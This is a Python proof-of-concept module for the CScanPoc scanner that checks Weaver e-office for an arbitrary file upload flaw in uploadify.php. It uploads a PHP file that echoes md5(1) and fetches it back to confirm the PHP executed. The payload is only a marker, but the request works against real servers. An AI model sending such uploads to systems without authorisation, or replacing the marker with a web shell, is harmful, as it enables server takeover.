# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time, re

class Vuln(ABVuln):
    poc_id = '9d752548-8948-46e6-9c8f-46eb706cec65'
    name = '泛微e-office 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2015-07-11'  # 漏洞公布时间
    desc = '''
        泛微e-cology 存在任意文件上传漏洞。
        inc/jquery/uploadify/uploadify.php
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = '泛微e-office'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'cfee4a73-b126-46d9-b59d-1ff7a604ee1d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2015-0125592
            hh = hackhttp.hackhttp()
            arg = self.target
            content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVO9PKsatIjWx0zBn'
            md5_1 = 'c4ca4238a0b923820dcc509a6f75849b'
            url = arg + '/inc/jquery/uploadify/uploadify.php'
            post = '''
                ------WebKitFormBoundaryVO9PKsatIjWx0zBn
                Content-Disposition: form-data; name="Filedata"; filename="test.php"
                Content-Type: text/html

                <?php echo md5(1); ?>
                ------WebKitFormBoundaryVO9PKsatIjWx0zBn--
            '''
            code, head, res, err, _ = hh.http(url, header=content_type, post=post)
            
            if code == 200:
                m = re.search(r'[\d]{10}', res)
                if m:
                    code, head, res, err, _ = hh.http(arg + 'attachment/' + m.group(0) + '/test.php')
                    if code == 200 and (md5_1 in res):
                        #security_hole('Arbitrarily file upload: ' + url)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
